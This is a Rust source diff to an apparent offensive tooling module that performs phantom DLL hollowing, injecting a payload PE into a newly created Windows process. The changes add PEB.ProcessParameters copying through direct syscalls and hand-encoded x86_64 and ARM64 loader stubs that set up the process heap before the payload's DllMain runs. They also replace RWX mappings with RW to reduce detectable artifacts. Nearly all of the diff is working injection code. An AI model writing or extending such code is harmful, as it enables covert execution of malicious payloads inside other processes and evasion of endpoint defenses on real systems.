@@ -3,7 +3,7 @@
 //!
 //! The technique works in four phases:
 //!
-//! 1. **Section creation** — `NtCreateSection(SEC_COMMIT, PAGE_EXECUTE_READWRITE)`
+//! 1. **Section creation** — `NtCreateSection(SEC_COMMIT, PAGE_EXECUTE_READWRITE)` (max prot)
 //!    + `NtMapViewOfSection` into the **calling** process to write the DLL bytes,
 //!    then `NtProtectVirtualMemory` to RX.
 //!
@@ -955,10 +955,11 @@ pub unsafe fn phantom_dll_hollow(payload: &[u8]) -> Result<PhantomHollowResult> 
 
     // ── Phase 1: Create phantom section + map into calling process ───────
     //
-    // We create a SEC_COMMIT section with PAGE_EXECUTE_READWRITE, map it into
-    // our own process (PAGE_READWRITE) to write the DLL bytes, then flip the
-    // local view to PAGE_EXECUTE_READ.  The section handle is kept so we can
-    // map it into the host process in Phase 3.
+    // We create a SEC_COMMIT section with PAGE_EXECUTE_READWRITE (the section
+    // maximum — required so mapped views can later be flipped to executable),
+    // map it into our own process (PAGE_READWRITE) to write the DLL bytes, then
+    // flip the local view to PAGE_EXECUTE_READ.  The section handle is kept so
+    // we can map it into the host process in Phase 3.
 
     let mut h_section: *mut c_void = std::ptr::null_mut();
     // Create a section large enough for the entire PE image.
@@ -1133,6 +1134,100 @@ pub unsafe fn phantom_dll_hollow(payload: &[u8]) -> Result<PhantomHollowResult> 
     }
     let peb_ptr = peb_addr as *const u8;
 
+    // ── MED-007: Initialize PEB.ProcessParameters ────────────────────────
+    //
+    // NtCreateProcessEx does not set PEB.ProcessParameters in the child.
+    // Without it, APIs like GetCommandLine / GetEnvironmentVariable crash
+    // or return garbage.  Copy our own params block to the target, fix up
+    // internal pointers, and write the target PEB field.
+    {
+        #[cfg(target_arch = "x86_64")]
+        let our_params: *const u8 = {
+            let teb: *const u8;
+            std::arch::asm!("mov {}, gs:[0x30]", out(reg) teb);
+            let peb = (teb.add(0x60) as *const *const u8).read_unaligned();
+            (peb.add(0x20) as *const *const u8).read_unaligned()
+        };
+        #[cfg(target_arch = "aarch64")]
+        let our_params: *const u8 = {
+            let teb: *const u8;
+            std::arch::asm!("mrs {}, tpidr_el0", out(reg) teb);
+            let peb = (teb.add(0x60) as *const *const u8).read_unaligned();
+            (peb.add(0x20) as *const *const u8).read_unaligned()
+        };
+
+        if !our_params.is_null() {
+            let max_len = unsafe { (our_params as *const u32).read_unaligned() as usize };
+            if max_len > 0 && max_len < 0x10000 {
+                let src_bytes = unsafe { std::slice::from_raw_parts(our_params, max_len) };
+                let mut params_buf = src_bytes.to_vec();
+
+                let mut target_params: *mut c_void = std::ptr::null_mut();
+                let mut alloc_size = max_len;
+                let _ = unsafe {
+                    crate::syscall!(
+                        "NtAllocateVirtualMemory",
+                        h_process as u64,
+                        &mut target_params as *mut _ as u64,
+                        0u64,
+                        &mut alloc_size as *mut _ as u64,
+                        (windows_sys::Win32::System::Memory::MEM_COMMIT
+                            | windows_sys::Win32::System::Memory::MEM_RESERVE)
+                            as u64,
+                        PAGE_READWRITE as u64,
+                    )
+                };
+
+                if !target_params.is_null() {
+                    let delta = target_params as isize - our_params as isize;
+                    // Fix up pointer fields in RTL_USER_PROCESS_PARAMETERS.
+                    // Each UNICODE_STRING.Buffer and the Environment pointer
+                    // need adjustment by the same delta.
+                    for &off in &[0x48usize, 0x58, 0x68, 0x78, 0x80, 0xB8, 0xC8, 0xD8, 0xE8] {
+                        if off + 8 <= params_buf.len() {
+                            let ptr = u64::from_le_bytes(
+                                params_buf[off..off + 8].try_into().unwrap_or([0u8; 8]),
+                            );
+                            if ptr != 0 {
+                                let fixed = (ptr as isize + delta) as u64;
+                                params_buf[off..off + 8].copy_from_slice(&fixed.to_le_bytes());
+                            }
+                        }
+                    }
+
+                    let mut written = 0usize;
+                    let _ = unsafe {
+                        crate::syscall!(
+                            "NtWriteVirtualMemory",
+                            h_process as u64,
+                            target_params as u64,
+                            params_buf.as_ptr() as u64,
+                            max_len as u64,
+                            &mut written as *mut _ as u64,
+                        )
+                    };
+
+                    // Write target PEB.ProcessParameters (offset 0x20).
+                    let pp_addr = target_params as usize;
+                    let _ = unsafe {
+                        nt_write_exact(
+                            h_process,
+                            peb_ptr.add(0x20) as usize,
+                            &pp_addr as *const _ as *const c_void,
+                            std::mem::size_of::<usize>(),
+                        )
+                    };
+
+                    tracing::debug!(
+                        "phantom_dll_hollow: initialized PEB.ProcessParameters at {:#x} ({} bytes)",
+                        pp_addr,
+                        written,
+                    );
+                }
+            }
+        }
+    }
+
     // Read PEB.ImageBaseAddress (offset 0x10).
     let mut remote_image_base: usize = 0;
     if !nt_read_exact(
@@ -1185,7 +1280,7 @@ pub unsafe fn phantom_dll_hollow(payload: &[u8]) -> Result<PhantomHollowResult> 
         &mut remote_view_size as *mut _ as u64,
         1u64, // ViewUnmap
         0u64,
-        PAGE_EXECUTE_READWRITE as u64, // initially RWX; we'll tighten per-section later
+        PAGE_READWRITE as u64, // initially RW for relocation fixups; tightened per-section later
     );
     let mapped_ok = match map_result {
         Ok(st) if st >= 0 && !remote_base.is_null() => true,
@@ -1207,7 +1302,7 @@ pub unsafe fn phantom_dll_hollow(payload: &[u8]) -> Result<PhantomHollowResult> 
             &mut remote_view_size as *mut _ as u64,
             1u64,
             0u64,
-            PAGE_EXECUTE_READWRITE as u64,
+            PAGE_READWRITE as u64,
         );
         match retry_result {
             Ok(st) if st >= 0 && !remote_base.is_null() => {}
@@ -1280,9 +1375,10 @@ pub unsafe fn phantom_dll_hollow(payload: &[u8]) -> Result<PhantomHollowResult> 
         tracing::warn!("phantom_dll_hollow: failed to update PEB.ImageBaseAddress");
     }
 
-    // ── Phase 4: Build loader stub (TLS callbacks, .pdata, DllMain) and resume ─
+    // ── Phase 4: Build loader stub (heap init, TLS callbacks, .pdata, DllMain) and resume ─
     //
     // The Windows loader normally:
+    //   0. Creates the default heap (RtlCreateHeap) and sets PEB.ProcessHeap.
     //   1. Calls RtlAddFunctionTable to register .pdata for SEH unwinding.
     //   2. Invokes TLS callbacks with (hinstDLL, DLL_PROCESS_ATTACH, NULL).
     //   3. Calls the entry point as DllMain(hinstDLL, DLL_PROCESS_ATTACH, NULL).
@@ -1367,17 +1463,54 @@ pub unsafe fn phantom_dll_hollow(payload: &[u8]) -> Result<PhantomHollowResult> 
         0
     };
 
-    let needs_stub =
-        !tls_callback_vas.is_empty() || (pdata_va != 0 && pdata_count != 0 && rtl_add_fn_addr != 0);
+    // Resolve RtlCreateHeap for PEB.ProcessHeap initialization (MED-007).
+    let rtl_create_heap_addr = resolve_nt(b"RtlCreateHeap\0").unwrap_or(0);
+    if rtl_create_heap_addr == 0 {
+        tracing::warn!(
+            "phantom_dll_hollow: RtlCreateHeap not found in ntdll; \
+             PEB.ProcessHeap will remain NULL — payload HeapAlloc may crash"
+        );
+    }
 
-    // Build the loader stub if needed, otherwise jump directly to entry point.
-    let thread_start_va = if needs_stub {
-        let mut stub: Vec<u8> = Vec::with_capacity(256);
+    // Always build a loader stub: even without TLS callbacks or .pdata,
+    // we must initialize PEB.ProcessHeap before DllMain runs (MED-007).
+    let thread_start_va = {
+        let mut stub: Vec<u8> = Vec::with_capacity(512);
 
         #[cfg(target_arch = "x86_64")]
         {
-            // ABI prologue: reserve 32 bytes of shadow space.
-            stub.extend_from_slice(&[0x48, 0x83, 0xEC, 0x20]); // sub rsp, 0x20
+            // ABI prologue: reserve shadow space + room for 5th/6th params.
+            stub.extend_from_slice(&[0x48, 0x83, 0xEC, 0x30]); // sub rsp, 0x30
+
+            // ── MED-007: Initialize PEB.ProcessHeap ─────────────────────
+            //
+            // RtlCreateHeap(HEAP_GROWABLE, NULL, 1MB, 64KB, NULL, NULL)
+            // stores the returned heap handle in PEB.ProcessHeap (gs:[0x60]+0x30).
+            if rtl_create_heap_addr != 0 {
+                // mov ecx, 2 (HEAP_GROWABLE = 0x00000002)
+                stub.extend_from_slice(&[0xB9, 0x02, 0x00, 0x00, 0x00]);
+                // xor edx, edx (HeapBase = NULL)
+                stub.extend_from_slice(&[0x31, 0xD2]);
+                // mov r8d, 0x100000 (ReserveSize = 1 MB)
+                stub.extend_from_slice(&[0x41, 0xB8]);
+                stub.extend_from_slice(&0x100_000u32.to_le_bytes());
+                // mov r9d, 0x10000 (CommitSize = 64 KB)
+                stub.extend_from_slice(&[0x41, 0xB9]);
+                stub.extend_from_slice(&0x1_0000u32.to_le_bytes());
+                // mov qword [rsp+0x20], 0 (Lock = NULL)
+                stub.extend_from_slice(&[0x48, 0xC7, 0x44, 0x24, 0x20, 0x00, 0x00, 0x00, 0x00]);
+                // mov qword [rsp+0x28], 0 (Parameters = NULL)
+                stub.extend_from_slice(&[0x48, 0xC7, 0x44, 0x24, 0x28, 0x00, 0x00, 0x00, 0x00]);
+                // mov rax, RtlCreateHeap
+                stub.extend_from_slice(&[0x48, 0xB8]);
+                stub.extend_from_slice(&(rtl_create_heap_addr as u64).to_le_bytes());
+                // call rax
+                stub.extend_from_slice(&[0xFF, 0xD0]);
+                // Store result: mov rcx, gs:[0x60] (PEB)
+                stub.extend_from_slice(&[0x65, 0x48, 0x8B, 0x0C, 0x25, 0x60, 0x00, 0x00, 0x00]);
+                // mov [rcx+0x30], rax  (PEB.ProcessHeap = heap handle)
+                stub.extend_from_slice(&[0x48, 0x89, 0x41, 0x30]);
+            }
 
             // .pdata registration.
             if pdata_va != 0 && pdata_count != 0 && rtl_add_fn_addr != 0 {
@@ -1414,7 +1547,7 @@ pub unsafe fn phantom_dll_hollow(payload: &[u8]) -> Result<PhantomHollowResult> 
             stub.extend_from_slice(&[0xFF, 0xD0]); // call rax
 
             // ABI epilogue.
-            stub.extend_from_slice(&[0x48, 0x83, 0xC4, 0x20]); // add rsp, 0x20
+            stub.extend_from_slice(&[0x48, 0x83, 0xC4, 0x30]); // add rsp, 0x30
 
             // Infinite halt after DllMain returns.
             stub.extend_from_slice(&[0xEB, 0xFE]); // jmp $-2
@@ -1422,6 +1555,33 @@ pub unsafe fn phantom_dll_hollow(payload: &[u8]) -> Result<PhantomHollowResult> 
 
         #[cfg(target_arch = "aarch64")]
         {
+            // ── MED-007: Initialize PEB.ProcessHeap via RtlCreateHeap ──
+            if rtl_create_heap_addr != 0 {
+                // x0 = HEAP_GROWABLE (2)
+                push_arm64_mov_imm64(&mut stub, 0, 2);
+                // x1 = NULL (HeapBase)
+                push_arm64_mov_imm64(&mut stub, 1, 0);
+                // x2 = 1MB (ReserveSize)
+                push_arm64_mov_imm64(&mut stub, 2, 0x100_000);
+                // x3 = 64KB (CommitSize)
+                push_arm64_mov_imm64(&mut stub, 3, 0x1_0000);
+                // x4 = NULL (Lock)
+                push_arm64_mov_imm64(&mut stub, 4, 0);
+                // x5 = NULL (Parameters)
+                push_arm64_mov_imm64(&mut stub, 5, 0);
+                // x16 = RtlCreateHeap address
+                push_arm64_mov_imm64(&mut stub, 16, rtl_create_heap_addr as u64);
+                push_arm64_blr(&mut stub, 16);
+                // Store result: x0 = heap handle
+                // Read PEB: mrs x1, tpidr_el0; ldr x1, [x1, #0x60]
+                // ARM64: MRS X1, TPIDR_EL0 = 0xD53BD021
+                push_arm64_instruction(&mut stub, 0xD53B_D021);
+                // ldr x1, [x1, #0x60]  (load PEB from TEB)
+                push_arm64_instruction(&mut stub, 0xF940_0000 | (12u32 << 10) | (1u32 << 5) | 1);
+                // str x0, [x1, #0x30]  (PEB.ProcessHeap)
+                push_arm64_instruction(&mut stub, 0xF900_0000 | (6u32 << 10) | (1u32 << 5) | 0);
+            }
+
             // .pdata registration: RtlAddFunctionTable(x0=funcTable, x1=count, x2=base)
             if pdata_va != 0 && pdata_count != 0 && rtl_add_fn_addr != 0 {
                 push_arm64_mov_imm64(&mut stub, 0, pdata_va as u64);
@@ -1521,16 +1681,14 @@ pub unsafe fn phantom_dll_hollow(payload: &[u8]) -> Result<PhantomHollowResult> 
         );
 
         tracing::debug!(
-            "phantom_dll_hollow: injected loader stub at {:p} ({} TLS callbacks, .pdata={} entries)",
+            "phantom_dll_hollow: injected loader stub at {:p} ({} TLS callbacks, .pdata={} entries, heap_init={})",
             stub_mem,
             tls_callback_vas.len(),
             pdata_count,
+            rtl_create_heap_addr != 0,
         );
 
         stub_mem as u64
-    } else {
-        // No TLS callbacks and no .pdata — set entry point directly.
-        (remote_base_usize + entry_point_rva) as u64
     };
 
     // Set the thread context and resume.
@@ -1989,6 +2147,98 @@ pub unsafe fn phantom_dll_hollow_into_process(
     }
     let peb_ptr = peb_addr as *const u8;
 
+    // ── MED-007: Initialize PEB.ProcessParameters ────────────────────────
+    //
+    // NtCreateProcessEx does not set PEB.ProcessParameters in the child.
+    // Without it, APIs like GetCommandLine / GetEnvironmentVariable crash
+    // or return garbage.  Copy our own params block to the target, fix up
+    // internal pointers, and write the target PEB field.
+    {
+        #[cfg(target_arch = "x86_64")]
+        let our_params: *const u8 = {
+            let teb: *const u8;
+            std::arch::asm!("mov {}, gs:[0x30]", out(reg) teb);
+            let peb = (teb.add(0x60) as *const *const u8).read_unaligned();
+            (peb.add(0x20) as *const *const u8).read_unaligned()
+        };
+        #[cfg(target_arch = "aarch64")]
+        let our_params: *const u8 = {
+            let teb: *const u8;
+            std::arch::asm!("mrs {}, tpidr_el0", out(reg) teb);
+            let peb = (teb.add(0x60) as *const *const u8).read_unaligned();
+            (peb.add(0x20) as *const *const u8).read_unaligned()
+        };
+
+        if !our_params.is_null() {
+            let max_len = unsafe { (our_params as *const u32).read_unaligned() as usize };
+            if max_len > 0 && max_len < 0x10000 {
+                let src_bytes = unsafe { std::slice::from_raw_parts(our_params, max_len) };
+                let mut params_buf = src_bytes.to_vec();
+
+                let mut target_params: *mut c_void = std::ptr::null_mut();
+                let mut alloc_size = max_len;
+                let _ = unsafe {
+                    crate::syscall!(
+                        "NtAllocateVirtualMemory",
+                        h_process as u64,
+                        &mut target_params as *mut _ as u64,
+                        0u64,
+                        &mut alloc_size as *mut _ as u64,
+                        (windows_sys::Win32::System::Memory::MEM_COMMIT
+                            | windows_sys::Win32::System::Memory::MEM_RESERVE)
+                            as u64,
+                        PAGE_READWRITE as u64,
+                    )
+                };
+
+                if !target_params.is_null() {
+                    let delta = target_params as isize - our_params as isize;
+                    // Fix up pointer fields in RTL_USER_PROCESS_PARAMETERS.
+                    for &off in &[0x48usize, 0x58, 0x68, 0x78, 0x80, 0xB8, 0xC8, 0xD8, 0xE8] {
+                        if off + 8 <= params_buf.len() {
+                            let ptr = u64::from_le_bytes(
+                                params_buf[off..off + 8].try_into().unwrap_or([0u8; 8]),
+                            );
+                            if ptr != 0 {
+                                let fixed = (ptr as isize + delta) as u64;
+                                params_buf[off..off + 8].copy_from_slice(&fixed.to_le_bytes());
+                            }
+                        }
+                    }
+
+                    let mut written = 0usize;
+                    let _ = unsafe {
+                        crate::syscall!(
+                            "NtWriteVirtualMemory",
+                            h_process as u64,
+                            target_params as u64,
+                            params_buf.as_ptr() as u64,
+                            max_len as u64,
+                            &mut written as *mut _ as u64,
+                        )
+                    };
+
+                    // Write target PEB.ProcessParameters (offset 0x20).
+                    let pp_addr = target_params as usize;
+                    let _ = unsafe {
+                        nt_write_exact(
+                            h_process,
+                            peb_ptr.add(0x20) as usize,
+                            &pp_addr as *const _ as *const c_void,
+                            std::mem::size_of::<usize>(),
+                        )
+                    };
+
+                    tracing::debug!(
+                        "phantom_dll_hollow_into_process: initialized PEB.ProcessParameters at {:#x} ({} bytes)",
+                        pp_addr,
+                        written,
+                    );
+                }
+            }
+        }
+    }
+
     // Read PEB.ImageBaseAddress (offset 0x10).
     let mut remote_image_base: usize = 0;
     if !nt_read_exact(
@@ -2044,7 +2294,7 @@ pub unsafe fn phantom_dll_hollow_into_process(
         &mut remote_view_size as *mut _ as u64,
         1u64,
         0u64,
-        PAGE_EXECUTE_READWRITE as u64,
+        PAGE_READWRITE as u64, // initially RW for relocation fixups; tightened per-section later
     );
     let mapped_ok = match map_result {
         Ok(st) if st >= 0 && !remote_base.is_null() => true,
@@ -2066,7 +2316,7 @@ pub unsafe fn phantom_dll_hollow_into_process(
             &mut remote_view_size as *mut _ as u64,
             1u64,
             0u64,
-            PAGE_EXECUTE_READWRITE as u64,
+            PAGE_READWRITE as u64,
         );
         match retry_result {
             Ok(st) if st >= 0 && !remote_base.is_null() => {}
@@ -2141,9 +2391,10 @@ pub unsafe fn phantom_dll_hollow_into_process(
         tracing::warn!("phantom_dll_hollow_into_process: failed to update PEB.ImageBaseAddress");
     }
 
-    // ── Phase 4: Build loader stub (TLS callbacks, .pdata, DllMain) and resume ─
+    // ── Phase 4: Build loader stub (heap init, TLS callbacks, .pdata, DllMain) and resume ─
     //
     // The Windows loader normally:
+    //   0. Creates the default heap (RtlCreateHeap) and sets PEB.ProcessHeap.
     //   1. Calls RtlAddFunctionTable to register .pdata for SEH unwinding.
     //   2. Invokes TLS callbacks with (hinstDLL, DLL_PROCESS_ATTACH, NULL).
     //   3. Calls the entry point as DllMain(hinstDLL, DLL_PROCESS_ATTACH, NULL).
@@ -2224,17 +2475,51 @@ pub unsafe fn phantom_dll_hollow_into_process(
         0
     };
 
-    let needs_stub =
-        !tls_callback_vas.is_empty() || (pdata_va != 0 && pdata_count != 0 && rtl_add_fn_addr != 0);
+    // Resolve RtlCreateHeap for PEB.ProcessHeap initialization (MED-007).
+    let rtl_create_heap_addr = resolve_nt(b"RtlCreateHeap\0").unwrap_or(0);
+    if rtl_create_heap_addr == 0 {
+        tracing::warn!(
+            "phantom_dll_hollow_into_process: RtlCreateHeap not found in ntdll; \
+             PEB.ProcessHeap will remain NULL — payload HeapAlloc may crash"
+        );
+    }
 
-    // Build the loader stub if needed, otherwise jump directly to entry point.
-    let thread_start_va = if needs_stub {
-        let mut stub: Vec<u8> = Vec::with_capacity(256);
+    // Always build a loader stub: even without TLS callbacks or .pdata,
+    // we must initialize PEB.ProcessHeap before DllMain runs (MED-007).
+    let thread_start_va = {
+        let mut stub: Vec<u8> = Vec::with_capacity(512);
 
         #[cfg(target_arch = "x86_64")]
         {
-            // ABI prologue: reserve 32 bytes of shadow space.
-            stub.extend_from_slice(&[0x48, 0x83, 0xEC, 0x20]); // sub rsp, 0x20
+            // ABI prologue: reserve shadow space + room for 5th/6th params.
+            stub.extend_from_slice(&[0x48, 0x83, 0xEC, 0x30]); // sub rsp, 0x30
+
+            // ── MED-007: Initialize PEB.ProcessHeap ─────────────────────
+            if rtl_create_heap_addr != 0 {
+                // mov ecx, 2 (HEAP_GROWABLE)
+                stub.extend_from_slice(&[0xB9, 0x02, 0x00, 0x00, 0x00]);
+                // xor edx, edx (HeapBase = NULL)
+                stub.extend_from_slice(&[0x31, 0xD2]);
+                // mov r8d, 0x100000 (ReserveSize = 1 MB)
+                stub.extend_from_slice(&[0x41, 0xB8]);
+                stub.extend_from_slice(&0x100_000u32.to_le_bytes());
+                // mov r9d, 0x10000 (CommitSize = 64 KB)
+                stub.extend_from_slice(&[0x41, 0xB9]);
+                stub.extend_from_slice(&0x1_0000u32.to_le_bytes());
+                // mov qword [rsp+0x20], 0 (Lock = NULL)
+                stub.extend_from_slice(&[0x48, 0xC7, 0x44, 0x24, 0x20, 0x00, 0x00, 0x00, 0x00]);
+                // mov qword [rsp+0x28], 0 (Parameters = NULL)
+                stub.extend_from_slice(&[0x48, 0xC7, 0x44, 0x24, 0x28, 0x00, 0x00, 0x00, 0x00]);
+                // mov rax, RtlCreateHeap
+                stub.extend_from_slice(&[0x48, 0xB8]);
+                stub.extend_from_slice(&(rtl_create_heap_addr as u64).to_le_bytes());
+                // call rax
+                stub.extend_from_slice(&[0xFF, 0xD0]);
+                // mov rcx, gs:[0x60] (PEB)
+                stub.extend_from_slice(&[0x65, 0x48, 0x8B, 0x0C, 0x25, 0x60, 0x00, 0x00, 0x00]);
+                // mov [rcx+0x30], rax (PEB.ProcessHeap)
+                stub.extend_from_slice(&[0x48, 0x89, 0x41, 0x30]);
+            }
 
             // .pdata registration.
             if pdata_va != 0 && pdata_count != 0 && rtl_add_fn_addr != 0 {
@@ -2271,7 +2556,7 @@ pub unsafe fn phantom_dll_hollow_into_process(
             stub.extend_from_slice(&[0xFF, 0xD0]); // call rax
 
             // ABI epilogue.
-            stub.extend_from_slice(&[0x48, 0x83, 0xC4, 0x20]); // add rsp, 0x20
+            stub.extend_from_slice(&[0x48, 0x83, 0xC4, 0x30]); // add rsp, 0x30
 
             // Infinite halt after DllMain returns.
             stub.extend_from_slice(&[0xEB, 0xFE]); // jmp $-2
@@ -2279,6 +2564,32 @@ pub unsafe fn phantom_dll_hollow_into_process(
 
         #[cfg(target_arch = "aarch64")]
         {
+            // ── MED-007: Initialize PEB.ProcessHeap via RtlCreateHeap ──
+            if rtl_create_heap_addr != 0 {
+                // x0 = HEAP_GROWABLE (2)
+                push_arm64_mov_imm64(&mut stub, 0, 2);
+                // x1 = NULL (HeapBase)
+                push_arm64_mov_imm64(&mut stub, 1, 0);
+                // x2 = 1MB (ReserveSize)
+                push_arm64_mov_imm64(&mut stub, 2, 0x100_000);
+                // x3 = 64KB (CommitSize)
+                push_arm64_mov_imm64(&mut stub, 3, 0x1_0000);
+                // x4 = NULL (Lock)
+                push_arm64_mov_imm64(&mut stub, 4, 0);
+                // x5 = NULL (Parameters)
+                push_arm64_mov_imm64(&mut stub, 5, 0);
+                // x16 = RtlCreateHeap address
+                push_arm64_mov_imm64(&mut stub, 16, rtl_create_heap_addr as u64);
+                push_arm64_blr(&mut stub, 16);
+                // Store result: x0 = heap handle
+                // Read PEB: mrs x1, tpidr_el0
+                push_arm64_instruction(&mut stub, 0xD53B_D021);
+                // ldr x1, [x1, #0x60]  (load PEB from TEB)
+                push_arm64_instruction(&mut stub, 0xF940_0000 | (12u32 << 10) | (1u32 << 5) | 1);
+                // str x0, [x1, #0x30]  (PEB.ProcessHeap)
+                push_arm64_instruction(&mut stub, 0xF900_0000 | (6u32 << 10) | (1u32 << 5) | 0);
+            }
+
             // .pdata registration: RtlAddFunctionTable(x0=funcTable, x1=count, x2=base)
             if pdata_va != 0 && pdata_count != 0 && rtl_add_fn_addr != 0 {
                 push_arm64_mov_imm64(&mut stub, 0, pdata_va as u64);
@@ -2381,16 +2692,14 @@ pub unsafe fn phantom_dll_hollow_into_process(
         );
 
         tracing::debug!(
-            "phantom_dll_hollow_into_process: injected loader stub at {:p} ({} TLS callbacks, .pdata={} entries)",
+            "phantom_dll_hollow_into_process: injected loader stub at {:p} ({} TLS callbacks, .pdata={} entries, heap_init={})",
             stub_mem,
             tls_callback_vas.len(),
             pdata_count,
+            rtl_create_heap_addr != 0,
         );
 
         stub_mem as u64
-    } else {
-        // No TLS callbacks and no .pdata — set entry point directly.
-        (remote_base_usize + entry_point_rva) as u64
     };
 
     // Set the thread context and resume.
